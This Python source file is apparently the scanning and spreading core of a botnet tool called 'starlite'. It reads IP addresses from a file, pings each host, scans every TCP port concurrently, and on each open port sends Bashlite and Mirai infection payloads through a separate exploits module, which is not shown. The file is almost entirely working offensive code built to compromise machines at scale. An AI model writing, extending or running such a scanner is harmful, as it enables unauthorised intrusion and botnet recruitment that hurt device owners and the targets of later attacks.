import asyncio
import socket
import time
from typing import Optional, Tuple
import exploits

# Constants
TIMEOUT_SEC = 5
MAX_PORT = 65535
THREADS_PER_IP = 10
TCP_PING_PORTS = [80, 443, 22, 21, 25, 3306, 3389, 8080, 8443]
MAX_CONCURRENT_CONNECTIONS = 100  # Limit concurrent connections

# Global connection pool
connection_semaphore = asyncio.Semaphore(MAX_CONCURRENT_CONNECTIONS)

async def try_connect_async(ip: str, port: int, timeout: float) -> Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]]:
    """Attempt to connect to an IP:port with connection pooling."""
    async with connection_semaphore:
        try:
            return await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=timeout
            )
        except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
            return None

async def scan_port_range_async(ip: str, start_port: int, end_port: int):
    for port in range(start_port, end_port + 1):
        streams = await try_connect_async(ip, port, TIMEOUT_SEC)
        if streams:
            _reader, writer = streams
            raw_socket_info = writer.get_extra_info('socket')
            thread_safe_sock = None

            if raw_socket_info:
                try:
                    fd = raw_socket_info.fileno()
                    thread_safe_sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)
                    
                    await asyncio.to_thread(exploits.send_bashlite_payload, thread_safe_sock, ip, port)
                    await asyncio.to_thread(exploits.send_mirai_payload, thread_safe_sock, ip, port)
                except Exception as e:
                    print(f"[starlite] [exploit_error] error during exploit sequence on {ip}:{port}: {e}")
                finally:
                    if thread_safe_sock:
                        thread_safe_sock.detach()
            else:
                print(f"[starlite] [warning] could not get raw socket info for {ip}:{port}")
            
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

async def scan_ip_async(ip: str):
    tasks = []
    ports_per_task = (MAX_PORT + 1) // THREADS_PER_IP
    if ports_per_task == 0:
        ports_per_task = 1

    for i in range(THREADS_PER_IP):
        start_port = i * ports_per_task
        end_port = (i + 1) * ports_per_task - 1
        if i == THREADS_PER_IP - 1:
            end_port = MAX_PORT
        
        if start_port > MAX_PORT:
            break
        end_port = min(end_port, MAX_PORT)

        if start_port <= end_port:
            task = asyncio.create_task(scan_port_range_async(ip, start_port, end_port))
            tasks.append(task)

    if tasks:
        await asyncio.gather(*tasks)
    print(f"[starlite] finished scanning {ip}")

async def ping_host_icmp_async(ip: str) -> bool:
    """ICMP ping with proper resource cleanup."""
    try:
        proc = await asyncio.create_subprocess_exec(
            'ping', '-c', '1', '-W', '1', ip,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )
        await proc.wait()
        return proc.returncode == 0
    except Exception as e:
        print(f"[starlite] [icmp_ping_async] Error for {ip}: {e}")
        return False

async def ping_host_tcp_async(ip: str, ports: list, timeout: float) -> bool:
    """TCP ping with connection pooling."""
    for port in ports:
        if await try_connect_async(ip, port, timeout):
            return True
    return False

async def deploy_scan_if_up_async(ip: str):
    print(f"[starlite] starting scan for {ip}")
    if await ping_host_icmp_async(ip):
        print(f"[starlite] ICMP echo reply from {ip}")
        await scan_ip_async(ip)
    else:
        print(f"[starlite] no ICMP echo reply from {ip}, attempting TCP ping to common ports")
        if await ping_host_tcp_async(ip, TCP_PING_PORTS, TIMEOUT_SEC):
            print(f"[starlite] found an open TCP port on {ip} via common port scan")
            await scan_ip_async(ip)
        else:
            print(f"[starlite] No open common TCP ports found for {ip}. Not proceeding with full scan.")

async def scan_ips_from_file_async(filename: str):
    try:
        with open(filename, 'r') as f:
            ips_to_scan = [line.strip() for line in f if line.strip()]
        
        if not ips_to_scan:
            print(f"[starlite] No IPs found in '{filename}'.")
            return

        ip_scan_concurrency_limit = 10 
        semaphore = asyncio.Semaphore(ip_scan_concurrency_limit)

        async def scan_with_semaphore(ip):
            async with semaphore:
                await deploy_scan_if_up_async(ip)

        tasks = [scan_with_semaphore(ip) for ip in ips_to_scan]
        await asyncio.gather(*tasks)

    except FileNotFoundError:
        print(f"[starlite] Error: IPs file '{filename}' not found.")
    except Exception as e:
        print(f"[starlite] Error reading or processing IPs file '{filename}': {e}")

async def main():
    print("Starting async scanner_logic.py - this is not part of the main scanner execution.")
    
    ips_file = "ips.txt"

    try:
        with open(ips_file, 'r') as f:
            if not f.read().strip():
                 print(f"'{ips_file}' is empty. Please add IP addresses to it.")
                 with open(ips_file, "w") as fw:
                    fw.write("127.0.0.1")
                 print(f"Added '127.0.0.1' to '{ips_file}' for testing.")

    except FileNotFoundError:
        print(f"'{ips_file}' not found. Creating a dummy one with '127.0.0.1'.")
        with open(ips_file, "w") as f:
            f.write("127.0.0.1")

    await scan_ips_from_file_async(ips_file)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[starlite] Scan interrupted by user.")